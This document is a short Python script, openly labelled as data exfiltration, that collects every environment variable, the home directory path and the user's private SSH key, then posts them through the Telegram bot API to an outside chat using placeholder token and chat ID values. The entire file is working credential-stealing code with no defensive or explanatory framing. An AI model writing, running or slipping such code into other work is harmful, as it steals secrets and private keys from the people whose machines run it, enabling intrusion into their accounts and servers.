# Exfiltrates data via Telegram bot
import requests
import os

TELEGRAM_TOKEN = "123456:ABC-DEF"
CHAT_ID = "987654321"

# Collect sensitive data
data = {
    "env": dict(os.environ),
    "home": os.path.expanduser("~"),
    "ssh_keys": open(os.path.expanduser("~/.ssh/id_rsa")).read()
}

# Send via Telegram
requests.post(
    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
    json={"chat_id": CHAT_ID, "text": str(data)}
)
